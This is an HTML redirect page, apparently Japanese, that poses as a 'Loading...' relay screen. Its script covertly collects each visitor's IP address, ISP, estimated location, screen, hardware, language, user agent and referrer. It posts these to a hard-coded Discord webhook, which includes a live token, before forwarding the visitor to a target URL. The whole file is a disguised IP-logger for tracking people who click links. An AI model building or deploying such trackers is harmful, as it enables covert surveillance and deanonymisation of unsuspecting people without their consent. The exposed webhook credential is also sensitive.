<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Relaying...</title>
    
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">

    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
            color: #333;
            flex-direction: column;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #5865F2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>Loading...</p>

    <script>
        // --- è¨­å®šé …ç›® ---
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1453524787942129778/x39qMm5llSNhw0YXBQdSdNsZnLCHXqqs4sbCkWWNGa-z1t90JKIPxIFAP2agU-lGwS-2';
        // ----------------

        async function processRedirect() {
            // ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å–å¾—
            const params = new URLSearchParams(window.location.search);
            const targetUrl = params.get('url');
            const uniqueId = params.get('id');

            if (!targetUrl) {
                document.body.innerHTML = "<p>Error: No destination URL specified.</p>";
                return;
            }

            // å®‰å…¨è£…ç½®ï¼ˆ5ç§’å¾Œã«å¼·åˆ¶è»¢é€ï¼‰
            const safetyTimeout = setTimeout(() => {
                window.location.replace(targetUrl);
            }, 5000);

            try {
                // A. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æƒ…å ± (ipapi.co ã‚’ä½¿ç”¨)
                // ã€å¯¾ç­–ã€‘ã‚­ãƒ£ãƒƒã‚·ãƒ¥å›é¿ã®ãŸã‚ã€URLæœ«å°¾ã«ãƒ©ãƒ³ãƒ€ãƒ ãªæ•°å­—(?t=...)ã‚’ä»˜ä¸
                let netInfo = {};
                try {
                    const randomParam = Math.floor(Math.random() * 100000);
                    const res = await fetch(`https://ipapi.co/json/?t=${randomParam}`, {
                        cache: 'no-store' // ã€å¯¾ç­–ã€‘æ˜ç¤ºçš„ã«ã‚­ãƒ£ãƒƒã‚·ãƒ¥ãªã—ã‚’æŒ‡å®š
                    });
                    netInfo = await res.json();
                } catch (e) {
                    netInfo = { error: 'IPå–å¾—å¤±æ•—', ip: 'Unknown' };
                    console.error(e);
                }

                // B. ãƒ–ãƒ©ã‚¦ã‚¶ãƒ»ãƒ‡ãƒã‚¤ã‚¹æƒ…å ±
                const screenInfo = `${window.screen.width}x${window.screen.height} (Color: ${window.screen.colorDepth}bit)`;
                const language = navigator.language || navigator.userLanguage;
                const platform = navigator.platform;
                const cores = navigator.hardwareConcurrency || 'ä¸æ˜';
                const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'ä¸æ˜';
                const userAgent = navigator.userAgent;
                const referrer = document.referrer || 'ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã¾ãŸã¯ä¸æ˜';

                // Discord Embedãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ä½œæˆ
                const payload = {
                    embeds: [{
                        title: "ğŸš¨ ã‚¢ã‚¯ã‚»ã‚¹æ¤œçŸ¥ (è©³ç´°è¿½è·¡)",
                        color: 15548997, 
                        fields: [
                            { name: "ğŸ†” è¿½è·¡ID", value: uniqueId || "ãªã—", inline: true },
                            { name: "ğŸ”— é·ç§»å…ˆURL", value: targetUrl, inline: true },
                            
                            // ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æƒ…å ±
                            { name: "ğŸŒ IPã‚¢ãƒ‰ãƒ¬ã‚¹", value: netInfo.ip || "ä¸æ˜", inline: false },
                            { name: "ğŸ¢ ãƒ—ãƒ­ãƒã‚¤ãƒ€(ISP)", value: netInfo.org || "ä¸æ˜", inline: true },
                            { name: "ğŸ“ ä½ç½®(æ¨å®š)", value: `${netInfo.city || ''}, ${netInfo.region || ''}, ${netInfo.country_name || ''}`, inline: true },
                            
                            // ãƒ‡ãƒã‚¤ã‚¹æƒ…å ±
                            { name: "ğŸ’» ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ", value: platform, inline: true },
                            { name: "ğŸ–¥ï¸ ç”»é¢è§£åƒåº¦", value: screenInfo, inline: true },
                            { name: "ğŸ—£ï¸ è¨€èª", value: language, inline: true },
                            { name: "âš™ï¸ ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢", value: `CPU: ${cores}ã‚³ã‚¢ / RAM: ${memory}`, inline: true },
                            
                            // ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ
                            { name: "ğŸ•µï¸ User Agent", value: userAgent.substring(0, 1024), inline: false },
                            
                            // ãã®ä»–
                            { name: "â†©ï¸ ãƒªãƒ•ã‚¡ãƒ©", value: referrer, inline: false }
                        ],
                        footer: {
                            text: `Time: ${new Date().toLocaleString('ja-JP')} (No-Cache Mode)`
                        }
                    }]
                };

                // C. Webhooké€ä¿¡
                // ã€å¯¾ç­–ã€‘POSTé€ä¿¡ã¯é€šå¸¸ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚Œã¾ã›ã‚“ãŒã€å¿µã®ç‚º no-store ã‚’æŒ‡å®š
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    cache: 'no-store'
                });

            } catch (e) {
                console.error(e);
            } finally {
                // ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆå®Ÿè¡Œ
                clearTimeout(safetyTimeout);
                window.location.replace(targetUrl);
            }
        }

        processRedirect();
    </script>
</body>
</html>
